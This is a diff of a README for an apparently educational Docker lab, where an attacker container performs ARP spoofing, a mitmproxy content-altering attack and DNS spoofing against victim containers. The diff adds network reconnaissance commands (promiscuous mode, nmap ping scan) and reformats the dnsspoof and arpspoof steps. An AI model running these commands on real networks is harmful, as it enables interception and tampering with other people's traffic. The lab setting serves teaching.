@@ -23,8 +23,14 @@ Firefox didn't work when networks configuration was provided.
 4. Open 2 instances of bash on Eve's container (or, equivalently, install and use tmux with two splits) (`docker exec -it eve bash`) and run the `dig` command to discover the IPs of Alice and Bob:
 
 ```bash
+ifconfig eth0 promisc # enable promiscuous mode
+arp -n
+ip -s -s neigh flush all # clear ARP cache
+apt update && apt install -y dnsutils nmap
+nmap -sn 172.18.0.0/24 # discover IPs in the network using ping scan
 dig alice
 dig bob
+arp -n
 ```
 
 5. With this information, now run arspoof twice, once for each bash instance.
@@ -61,31 +67,31 @@ mitmproxy -m transparent -s proxy.py
 12. Reload the browser page: the attacker has changed the contents of the website.
 13. To shut down everything use the `del_iptables_rul.sh` script in the `eve` folder to remove the iptables rule and turn off the two arpspoof instances
 
-
 ## DNS Spoof - Not Working YET!!!
 
-1. Connect to client's firefox browser from system. Open browser on system and go to http://localhost:5800 
-    - go to google.com from client's firefox and make sure it's legit domain
+1. Connect to client's firefox browser from system. Open browser on system and go to http://localhost:5800
 
+   - go to google.com from client's firefox and make sure it's legit domain
 
 2. Create fake DNS hosts file on the attacker's container
-    - use server's ip for demo
-    ```bash
-    dig server
-    echo -e '<fake_server_ip>\twww.google.com' > hosts
-    dnsspoof -i eth0 -f hosts
-    ```
 
-3. Run arpspoof on gateway (usually: *.*.0.1) and the client/victim from attacker's machine
+   - use server's ip for demo
 
-    - Connect to the attacker's Terminal, find gateway ip and run aprpsoof
+   ```bash
+   dig server
+   echo -e '<fake_server_ip>\twww.google.com' > hosts
+   dnsspoof -i eth0 -f hosts
+   ```
 
+3. Run arpspoof on gateway (usually: _._.0.1) and the client/victim from attacker's machine
 
-    ```bash
-    docker exec -it eve /bin/bash
-    arp -n
-    dig client
-    arpspoof -i eth0 -t <gateway_ip> -r <client_ip>
-    ```
+   - Connect to the attacker's Terminal, find gateway ip and run aprpsoof
+
+   ```bash
+   docker exec -it eve /bin/bash
+   arp -n
+   dig client
+   arpspoof -i eth0 -t <gateway_ip> -r <client_ip>
+   ```
 
 4. Browse google.com from client firefox again
